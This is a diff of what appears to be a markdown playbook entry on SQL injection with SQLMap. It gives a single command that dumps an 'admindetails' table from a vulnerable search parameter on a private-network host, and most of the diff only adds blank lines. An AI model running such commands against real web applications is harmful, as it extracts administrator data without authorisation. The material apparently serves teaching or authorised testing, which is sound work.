@@ -36,15 +36,33 @@ SQLMap is an automated SQL Injection exploitation tool. This can be used to inse
 
 *--D is used to specify the database name, -T to specify table name and --dump to list the contents*
 
+
+
 # Procedure
 
+
+
 1. Use the below SQLMap command to dump the contents from the database tables.
+
+
+
+
+
+
+
+
 
 **Command** ([[SQLMap Command to Dump Database Contents]]):
 
 ```bash
 sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --dump
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -63,3 +81,5 @@ sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --du
 - [[SQL Injection]]
 - [[SQLMap]]
 - [[Web Applications]]
+
+
